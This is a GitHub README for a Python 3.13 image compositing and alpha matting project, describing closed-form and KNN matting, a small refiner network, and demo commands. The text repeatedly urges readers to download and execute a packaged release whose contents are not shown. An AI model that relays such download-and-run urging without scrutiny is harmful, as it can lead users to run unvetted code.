# 🚀 Compositing and Matting — Python 3.13 Edition for Image Vision

[![Releases](https://img.shields.io/badge/Download-Releases-blue?logo=github)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases)

![Compositing Banner](https://raw.githubusercontent.com/opencv/opencv/master/samples/data/lena.jpg)

Tags: ai · classical-computer-vision · classical-image-processing · computer-vision · image-processing · neural-network · numpy · opencv · python3

About
----
This repo redoes a previous project in Python 3.13. It focuses on image compositing and alpha matting. The code mixes classic image processing with small neural components. You will find pipelines, helper tools, demos, and ready-to-run release files. Download the release from the releases page, then run the included demo script. The release file needs to be downloaded and executed from the releases page: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases

Why this repo
----
- Recreate classic matting algorithms in clean Python.
- Provide a compact demo that runs on modern hardware.
- Offer both numpy/OpenCV implementations and small neural refiners.
- Make it easy to study, adapt, and extend.

Key features
----
- Multiple matting methods: trimap-based closed-form matting, KNN matting, and a small refinement network.
- Fast RGB-A compositing helpers and blend modes.
- Tools for trimap generation and evaluation metrics (MSE, SAD, gradient error).
- Demo scripts for batch processing and interactive preview.
- Test images and sample trimaps.

Badges
----
[![Python](https://img.shields.io/badge/python-3.13-blue)](https://www.python.org/downloads/release/python-313/)
[![OpenCV](https://img.shields.io/badge/OpenCV-4.x-orange)](https://opencv.org)
[![NumPy](https://img.shields.io/badge/NumPy-1.26-yellowgreen)](https://numpy.org)

Quick start
----
1. Install Python 3.13.
2. Create a virtual environment.
3. Install dependencies.
4. Download the release file from the releases page and run the demo.

Example commands (Linux / macOS)
```bash
python3.13 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
# Download the release zip from:
# https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases
# Then extract and run:
python run_demo.py --input samples/input.jpg --trimap samples/trimap.png
```

Releases
----
The releases page contains packaged builds and a demo bundle. Download the release file and execute the included demo script or package. Typical release content:
- compositing_and_matting_py3_edition_v1.0.zip
  - run_demo.py
  - requirements.txt
  - models/refiner.pth
  - samples/

Visit and download the release file here: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases

If you prefer not to use the release bundle, clone this repo and run the demo from source.

Installation from source
----
1. Clone the repo
```bash
git clone https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-.git
cd compositing-and-matting-PYTHON-EDITION-
```
2. Create and activate a venv
```bash
python3.13 -m venv .venv
source .venv/bin/activate
```
3. Install required packages
```bash
pip install -r requirements.txt
```
4. Run a demo
```bash
python run_demo.py --input samples/input.jpg --trimap samples/trimap.png --mode closed_form
```

Core modules
----
- src/matting/trimap.py — trimap helpers and generation tools.
- src/matting/closed_form.py — closed-form alpha matting (linear system solver).
- src/matting/knn_matting.py — KNN-based matting.
- src/matting/refiner.py — small CNN refiner (PyTorch) for boundary cleanup.
- src/compositing/blend.py — compositing and common blend modes.
- src/utils/metrics.py — MSE, SAD, gradient error for alpha evaluation.
- src/utils/io.py — load/save helpers and visualization tools.

Algorithms explained
----
Closed-form matting
- Build a small linear system from local color statistics.
- Solve for alpha in sparse form.
- Use a trimap to fix known foreground and background.
- This yields smooth alpha that respects local color structure.

KNN matting
- Compute affinities using nearest neighbors in color-space.
- Solve for alpha using a graph-based formulation.
- Works well when colors cluster and the background is textured.

Neural refiner
- A shallow U-Net refines a predicted alpha.
- Input: RGB + coarse alpha (4 channels).
- Output: refined alpha.
- Model stays small to run on CPUs and low-end GPUs.

Trimap generation
- Provide manual trimaps for best results.
- Use automated trimap tool for batch runs.
- The repo includes a simple stroke-based GUI for quick trimap creation.

Demos and examples
----
- run_demo.py — single image demo with chosen mode.
- batch_process.py — process a folder of images and save results.
- interactive_trim.py — small GUI to draw trimaps and test modes.
- demo_notebook.ipynb — step-by-step exploration and visualization.

Command examples
----
Run closed-form matting:
```bash
python run_demo.py --input samples/hair.jpg --trimap samples/hair_trimap.png --mode closed_form --save out/hair_alpha.png
```
Run KNN matting:
```bash
python run_demo.py --input samples/object.jpg --trimap samples/object_trimap.png --mode knn
```
Refine with neural net:
```bash
python run_demo.py --input samples/object.jpg --trimap samples/object_trimap.png --mode closed_form --refine --model models/refiner.pth
```

Performance and tips
----
- Resize large images before matting to speed up processing.
- Use multi-scale: solve alpha on a downsampled image, then refine at full size.
- For tricky hair, combine closed-form and refiner for best edges.
- Trimaps that mark a small unknown band yield better results than large unknown areas.

Evaluation
----
The repo includes scripts to compute common matting metrics on a test set:
- Mean Squared Error (MSE) on alpha.
- Sum of Absolute Differences (SAD).
- Gradient error to measure edge fidelity.

Contributing
----
- Open issues for bugs or feature requests.
- Add test images or new matting methods.
- Create PRs with clear descriptions and small changes.
- Follow the code style in src/ and add tests in tests/.

Code style and tests
----
- Keep functions small and focused.
- Use numpy and OpenCV for core image ops.
- Tests use pytest and sample images in samples/.
- Run tests:
```bash
pytest -q
```

Dependencies
----
Primary packages:
- numpy
- opencv-python
- scikit-image
- matplotlib
- scipy
- torch (optional, for refiner)

A sample requirements.txt entry:
```
numpy>=1.26
opencv-python>=4.7
scikit-image>=0.20
matplotlib>=3.8
scipy>=1.11
torch>=2.2  # optional: only needed for refine mode
```

Files to check in the release
----
The release bundle typically contains:
- run_demo.py — ready-to-run demo. Download and execute this file to try the demo.
- requirements.txt — install exact dependencies.
- models/refiner.pth — pretrained refiner model.
- samples/ — example images and trimaps.

License
----
This project uses an open license. See LICENSE for details.

Contact
----
- Repo: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/
- Issues: open an issue on GitHub to report a bug or ask for help.

Assets and images used
----
- OpenCV sample images for demos.
- NumPy and OpenCV logos for badges.
- Example result images included in samples/.

Releases again
----
Get the packaged demo and run it. Download the release file and execute the demo script inside the package. Visit the releases page to download: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases

Acknowledgements
----
This project builds on classic matting papers and public code. It mixes well-known algorithms with practical code for learning and testing.